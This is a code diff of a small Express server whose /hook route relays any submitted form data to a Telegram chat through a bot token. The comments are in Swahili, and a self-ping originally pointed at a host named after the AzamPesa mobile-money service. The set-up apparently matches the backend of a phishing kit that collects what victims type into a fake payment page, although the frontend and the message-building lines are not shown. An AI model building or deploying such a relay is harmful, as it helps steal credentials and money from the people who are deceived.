@@ -1,16 +1,17 @@
 const express = require("express");
 const axios = require("axios");
 const cors = require("cors");
-const path = require("path");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// Soma BOT TOKEN na CHAT ID kutoka env
 const botToken = process.env.BOT_TOKEN;
 const chatId = process.env.CHAT_ID;
 
+// Hakikisha zipo
 if (!botToken || !chatId) {
-  console.error("BOT_TOKEN or CHAT_ID missing");
+  console.error("BOT_TOKEN or CHAT_ID missing from environment variables.");
   process.exit(1);
 }
 
@@ -18,13 +19,12 @@ app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ✅ Serve static frontend files from public/
-app.use(express.static(path.join(__dirname, "public")));
-
+// Root route (keep alive or health check)
 app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "index.html"));
+  res.send("Webhook server is live.");
 });
 
+// Hook route for receiving data from frontend
 app.post("/hook", async (req, res) => {
   const data = req.body;
 
@@ -36,7 +36,8 @@ app.post("/hook", async (req, res) => {
   try {
     await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       chat_id: chatId,
-      text: message
+      text: message,
+      parse_mode: "Markdown"
     });
 
     res.status(200).json({ status: "success" });
@@ -46,12 +47,14 @@ app.post("/hook", async (req, res) => {
   }
 });
 
+// Self ping to keep Render awake
 setInterval(() => {
-  axios.get("https://azampesa.onrender.com/")
+  axios.get("https://your-render-url.onrender.com/")
     .then(() => console.log("Self-ping successful"))
     .catch(err => console.error("Self-ping failed:", err.message));
-}, 1000 * 60 * 14);
+}, 1000 * 60 * 14); // Every 14 mins
 
+// Start server
 app.listen(PORT, () => {
-  console.log(`Server running on ${PORT}`);
+  console.log(`Server is running on port ${PORT}`);
 });
